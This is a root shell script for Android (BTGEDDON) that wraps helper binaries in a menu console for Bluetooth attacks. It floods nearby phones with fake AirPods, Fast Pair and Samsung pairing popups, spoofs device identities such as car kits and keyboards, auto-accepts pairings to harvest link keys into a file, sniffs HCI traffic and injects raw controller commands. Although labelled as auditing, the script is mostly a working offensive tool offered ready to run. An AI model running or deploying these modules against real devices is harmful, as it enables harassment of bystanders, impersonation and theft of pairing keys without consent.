#!/system/bin/sh
# ==============================================================================
# BTGEDDON: Next-Gen Native Mobile Bluetooth Auditing & Spoofing Console
# Tailored for Realme Narzo 30A (MediaTek MT6768 / MT6631) & Android Root
# Pure-Linux Hardware Baseband Integration via /dev/stpbt
# ==============================================================================

export PATH="/data/adb/modules/mtk-aircrack-core/system/bin:/system/xbin:/data/data/com.termux/files/usr/bin:/system_ext/bin:/system/bin:/vendor/bin:$PATH"
export LD_LIBRARY_PATH="/data/data/com.termux/files/usr/lib:$LD_LIBRARY_PATH"
export TERM="${TERM:-xterm-256color}"

# Colors
C_RED="\033[1;31m"
C_GRN="\033[1;32m"
C_YLW="\033[1;33m"
C_BLU="\033[1;34m"
C_MAG="\033[1;35m"
C_CYN="\033[1;36m"
C_WHT="\033[1;37m"
C_DIM="\033[2m"
C_RST="\033[0m"

# Portable POSIX print functions (prevents literal '-e' on Android toybox/mksh)
p() {
    printf "%b\n" "$*"
}

pn() {
    printf "%b" "$*"
}

BT_DEV="/dev/stpbt"
OUTPUT_DIR="/sdcard/btgeddon"
mkdir -p "$OUTPUT_DIR" 2>/dev/null || OUTPUT_DIR="/data/local/tmp/btgeddon"
mkdir -p "$OUTPUT_DIR" 2>/dev/null

CURRENT_PROFILE="None (Idle)"
CURRENT_COD="0x000000"
ANDC_MODE="ON"
BG_PID=""

check_root() {
    if [ "$(id -u)" != "0" ]; then
        p "${C_RED}[-] Error: btgeddon must be run as root (su).${C_RST}" >&2
        exit 1
    fi
}

check_baseband() {
    if [ ! -c "$BT_DEV" ]; then
        p "${C_RED}[-] Baseband device ($BT_DEV) not found!${C_RST}" >&2
        p "${C_YLW}[*] Ensure wmt_drv and bt_drv modules are loaded.${C_RST}" >&2
        return 1
    fi
    return 0
}

stop_background_process() {
    if [ -n "$BG_PID" ] && kill -0 "$BG_PID" 2>/dev/null; then
        kill -TERM "$BG_PID" 2>/dev/null
        sleep 0.3
        kill -9 "$BG_PID" 2>/dev/null
        BG_PID=""
    fi
    killall -9 bt-agent bt-inject btmon-mtk 2>/dev/null
}

cleanup() {
    trap - INT TERM EXIT
    stop_background_process
    p ""
    p "${C_CYN}[*] Radio powered down cleanly. Goodbye!${C_RST}"
    exit 0
}

trap cleanup INT TERM EXIT

print_header() {
    clear
    p "${C_MAG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RST}"
    p "${C_WHT}          BTGEDDON  ${C_MAG}[MediaTek MT6631]${C_RST}"
    p "${C_DIM}    Hardware Bluetooth 5.0 Auditing Console${C_RST}"
    p "${C_MAG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RST}"

    local dev_stat="${C_GRN}ONLINE${C_RST}"
    [ ! -c "$BT_DEV" ] && dev_stat="${C_RED}OFFLINE${C_RST}"

    p " ${C_CYN}Baseband:${C_RST} $dev_stat | ${C_CYN}Android Mode (--andc):${C_RST} ${C_YLW}$ANDC_MODE${C_RST}"
    p " ${C_CYN}Identity:${C_RST} ${C_WHT}$CURRENT_PROFILE${C_RST} (${C_YLW}$CURRENT_COD${C_RST})"
    p "${C_MAG}──────────────────────────────────────────────────${C_RST}"
}

pause() {
    p ""
    pn "${C_DIM}Press [Enter] to return...${C_RST}"
    read -r _
}

# ==============================================================================
# MODULE 1: BLE PROXIMITY BEACON & NOTIFICATION FLOODER
# ==============================================================================
menu_ble_flood() {
    while true; do
        print_header
        p "  ${C_WHT}[ MODULE 1: BLE BEACON & POPUP INJECTION ]${C_RST}\n"
        p "   ${C_CYN}[1]${C_RST} Apple AirPods Pro Pairing Prompt (iOS)"
        p "   ${C_CYN}[2]${C_RST} Google Fast Pair Device (Pixel Buds)"
        p "   ${C_CYN}[3]${C_RST} Samsung Galaxy Buds Notification"
        p "   ${C_CYN}[4]${C_RST} Apple iBeacon Proximity Frame"
        p "   ${C_CYN}[5]${C_RST} Multi-Vector Continuous Spam Flood (--spam)"
        p "   ${C_CYN}[6]${C_RST} Custom Device Name Broadcast (--name)"
        p "   ${C_CYN}[7]${C_RST} Toggle Android Mode (--andc) [Current: ${C_YLW}$ANDC_MODE${C_RST}]\n"
        p "   ${C_CYN}[0]${C_RST} Return to Main Menu\n"
        pn "${C_YLW}Select option [0-7]: ${C_RST}"
        read -r choice

        stop_background_process

        local andc_flag=""
        [ "$ANDC_MODE" = "ON" ] && andc_flag="--andc"

        case "$choice" in
            1)
                p "\n${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
                read -r dur; [ -z "$dur" ] && dur=20
                p ""
                bt-inject --airpods $andc_flag -d "$dur"
                pause
                ;;
            2)
                p "\n${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
                read -r dur; [ -z "$dur" ] && dur=20
                p ""
                bt-inject --fastpair $andc_flag -d "$dur"
                pause
                ;;
            3)
                p "\n${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
                read -r dur; [ -z "$dur" ] && dur=20
                p ""
                bt-inject --samsung $andc_flag -d "$dur"
                pause
                ;;
            4)
                p "\n${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
                read -r dur; [ -z "$dur" ] && dur=20
                p ""
                bt-inject --ibeacon $andc_flag -d "$dur"
                pause
                ;;
            5)
                p "\n${C_CYN}[*] Burst Interval in ms [default: 50]:${C_RST}"
                read -r interval; [ -z "$interval" ] && interval=50
                p "${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
                read -r dur; [ -z "$dur" ] && dur=0
                p ""
                bt-inject --spam $andc_flag -i "$interval" -d "$dur"
                pause
                ;;
            6)
                p "\n${C_CYN}[*] Enter Custom Device Name to broadcast:${C_RST}"
                read -r cname
                if [ -n "$cname" ]; then
                    p "${C_CYN}[*] Duration in seconds [0 = infinite]:${C_RST}"
                    read -r dur; [ -z "$dur" ] && dur=20
                    p ""
                    bt-inject --name "$cname" -d "$dur"
                fi
                pause
                ;;
            7)
                if [ "$ANDC_MODE" = "ON" ]; then
                    ANDC_MODE="OFF"
                else
                    ANDC_MODE="ON"
                fi
                ;;
            0)
                break
                ;;
            *)
                ;;
        esac
    done
}

# ==============================================================================
# MODULE 2: CLASSIC BLUETOOTH IDENTITY & PROFILE FAKER
# ==============================================================================
menu_profile_faker() {
    while true; do
        print_header
        p "  ${C_WHT}[ MODULE 2: DEVICE IDENTITY & PROFILE FAKER ]${C_RST}\n"
        p "   ${C_CYN}[1]${C_RST} Wireless Audio Headset (CoD: 0x240404 - Media Audio)"
        p "   ${C_CYN}[2]${C_RST} Car Stereo & Handsfree (CoD: 0x200408 - Car Audio)"
        p "   ${C_CYN}[3]${C_RST} Smartphone Identity (CoD: 0x5A020C - Phonebook/PBAP)"
        p "   ${C_CYN}[4]${C_RST} Internet Tethering AP (CoD: 0x020100 - PAN Gateway)"
        p "   ${C_CYN}[5]${C_RST} Wireless Keyboard (CoD: 0x002540 - HID)"
        p "   ${C_CYN}[6]${C_RST} Custom Builder (Set Name & CoD Hex)\n"
        p "   ${C_CYN}[0]${C_RST} Return to Main Menu\n"
        pn "${C_YLW}Select option [0-6]: ${C_RST}"
        read -r choice

        stop_background_process

        case "$choice" in
            1)
                CURRENT_PROFILE="BT Headset Pro"
                CURRENT_COD="0x240404"
                p ""
                bt-agent --audio
                pause
                ;;
            2)
                CURRENT_PROFILE="My Car Stereo"
                CURRENT_COD="0x200408"
                p ""
                bt-agent --carkit
                pause
                ;;
            3)
                CURRENT_PROFILE="Galaxy S22"
                CURRENT_COD="0x5A020C"
                p ""
                bt-agent --phone
                pause
                ;;
            4)
                CURRENT_PROFILE="Internet Gateway"
                CURRENT_COD="0x020100"
                p ""
                bt-agent --pan
                pause
                ;;
            5)
                CURRENT_PROFILE="Magic Keyboard"
                CURRENT_COD="0x002540"
                p ""
                bt-agent --keyboard
                pause
                ;;
            6)
                p "\n${C_CYN}[*] Enter Custom Bluetooth Device Name:${C_RST}"
                read -r cname; [ -z "$cname" ] && cname="Custom BT"
                p "${C_CYN}[*] Enter Class of Device in Hex [e.g. 240404]:${C_RST}"
                read -r c_cod; [ -z "$c_cod" ] && c_cod="240404"
                CURRENT_PROFILE="$cname"
                CURRENT_COD="0x$c_cod"
                p ""
                bt-agent --name "$cname" --cod "$c_cod"
                pause
                ;;
            0)
                break
                ;;
            *)
                ;;
        esac
    done
}

# ==============================================================================
# MODULE 3: AUTO-PAIRING & LINK KEY HARVESTER
# ==============================================================================
menu_pairing_harvester() {
    print_header
    p "  ${C_WHT}[ MODULE 3: AUTO-PAIRING & LINK KEY HARVESTER ]${C_RST}\n"
    p "   ${C_CYN}[*]${C_RST} Auto-accepts all incoming pairing requests"
    p "       using Simple Secure Pairing (SSP Just-Works)."
    p "   ${C_CYN}[*]${C_RST} Keys saved to: ${C_YLW}$OUTPUT_DIR/harvested_keys.txt${C_RST}\n"
    p "   Choose identity for auto-pairing:"
    p "   ${C_CYN}[1]${C_RST} Audio Headset ('BT Headset Pro')"
    p "   ${C_CYN}[2]${C_RST} Car Stereo ('My Car Audio')"
    p "   ${C_CYN}[3]${C_RST} Smartphone ('Android Device')"
    p "   ${C_CYN}[0]${C_RST} Cancel & Return\n"
    pn "${C_YLW}Select option [0-3]: ${C_RST}"
    read -r p_choice

    local p_flag="--audio"
    case "$p_choice" in
        1) p_flag="--audio" ;;
        2) p_flag="--carkit" ;;
        3) p_flag="--phone" ;;
        0) return ;;
        *) p_flag="--audio" ;;
    esac

    stop_background_process
    p "\n${C_GRN}[+] Launching Auto-Pairing Interceptor...${C_RST}\n"
    
    bt-agent $p_flag | tee -a "$OUTPUT_DIR/harvested_keys.txt"
    pause
}

# ==============================================================================
# MODULE 4: LIVE BASEBAND SNIFFER & PCAP CAPTURE
# ==============================================================================
menu_sniffer() {
    print_header
    p "  ${C_WHT}[ MODULE 4: LIVE BASEBAND HCI SNIFFER & PCAP ]${C_RST}\n"
    local pcap_name="bt_sniff_$(date +%Y%m%d_%H%M%S).pcap"
    local pcap_path="$OUTPUT_DIR/$pcap_name"

    p "   ${C_CYN}[1]${C_RST} Live Terminal Decoded Sniffing"
    p "   ${C_CYN}[2]${C_RST} Capture to Wireshark PCAP File (DLT=201)"
    p "   ${C_CYN}[0]${C_RST} Return\n"
    pn "${C_YLW}Select option [0-2]: ${C_RST}"
    read -r s_choice

    stop_background_process

    case "$s_choice" in
        1)
            p "\n${C_CYN}[*] Starting live baseband decoder (Ctrl+C to stop)...${C_RST}\n"
            btmon-mtk
            pause
            ;;
        2)
            p "\n${C_GRN}[+] Writing Wireshark PCAP to: ${C_WHT}$pcap_path${C_RST}"
            p "${C_CYN}[*] Sniffing live traffic (Press Ctrl+C to save)...${C_RST}\n"
            btmon-mtk -w "$pcap_path"
            p "\n${C_GRN}[✓] Saved PCAP successfully! (${C_WHT}$pcap_path${C_GRN})${C_RST}"
            pause
            ;;
        *)
            return
            ;;
    esac
}

# ==============================================================================
# MODULE 5: RAW BASEBAND HCI INJECTOR
# ==============================================================================
menu_raw_hci() {
    print_header
    p "  ${C_WHT}[ MODULE 5: RAW BASEBAND HCI INJECTOR ]${C_RST}\n"
    p "   Send arbitrary raw hex command frames directly to hardware."
    p "   Format: Hex byte string (e.g. 01030c00 for HCI_Reset)\n"
    p "   Examples:"
    p "     ${C_CYN}01030C00${C_RST}                       HCI Reset"
    p "     ${C_CYN}01011000${C_RST}                       Read Version Info"
    p "     ${C_CYN}01091000${C_RST}                       Read BD_ADDR"
    p "     ${C_CYN}010520061122334455C6${C_RST}           Set Random BLE MAC\n"
    pn "${C_YLW}Enter Hex Command (or 0 to cancel): ${C_RST}"
    read -r hex_cmd

    [ -z "$hex_cmd" ] || [ "$hex_cmd" = "0" ] && return

    stop_background_process
    p ""
    bt-inject --custom "$hex_cmd"
    pause
}

# ==============================================================================
# MODULE 6: RADIO RESET & DIAGNOSTICS
# ==============================================================================
menu_diagnostics() {
    print_header
    p "  ${C_WHT}[ MODULE 6: RADIO DIAGNOSTICS & RESET ]${C_RST}\n"
    stop_background_process
    p "   ${C_CYN}[*]${C_RST} Querying MT6631 Baseband Hardware Information..."
    
    pn "   ${C_WHT}Hardware BD_ADDR:   ${C_RST}"
    bt-inject --custom "01091000" | grep "Controller Ack" || echo "Unknown"

    pn "   ${C_WHT}HCI/LMP Version:    ${C_RST}"
    bt-inject --custom "01011000" | grep "Controller Ack" || echo "Unknown"

    p "\n   ${C_GRN}[✓] Baseband responds normally to raw HCI transactions.${C_RST}"
    pause
}

# ==============================================================================
# MAIN TUI LOOP
# ==============================================================================
check_root
check_baseband || exit 1

while true; do
    print_header
    p "  ${C_WHT}OFFENSIVE & AUDITING MODULES:${C_RST}\n"
    p "   ${C_MAG}[1]${C_RST}  BLE Beacon & Popup Flooder  ${C_DIM}(AirPods/FastPair/Spam)${C_RST}"
    p "   ${C_MAG}[2]${C_RST}  Classic Profile & CoD Faker ${C_DIM}(Headset/CarKit/Phone/PAN)${C_RST}"
    p "   ${C_MAG}[3]${C_RST}  Auto-Pairing Key Harvester  ${C_DIM}(Just-Works SSP Auto-Accept)${C_RST}"
    p "   ${C_MAG}[4]${C_RST}  Live Sniffer & PCAP Capture ${C_DIM}(HCI H4 Dump Link=201)${C_RST}"
    p "   ${C_MAG}[5]${C_RST}  Raw Baseband HCI Injector   ${C_DIM}(Hex Command Console)${C_RST}"
    p "   ${C_MAG}[6]${C_RST}  Radio Diagnostics & Query   ${C_DIM}(BD_ADDR & Version Query)${C_RST}\n"
    p "   ${C_CYN}[0]${C_RST}  Exit Console\n"
    pn "${C_YLW}Select module [0-6]: ${C_RST}"
    read -r main_opt

    case "$main_opt" in
        1) menu_ble_flood ;;
        2) menu_profile_faker ;;
        3) menu_pairing_harvester ;;
        4) menu_sniffer ;;
        5) menu_raw_hci ;;
        6) menu_diagnostics ;;
        0|x|q) cleanup ;;
        *) ;;
    esac
done
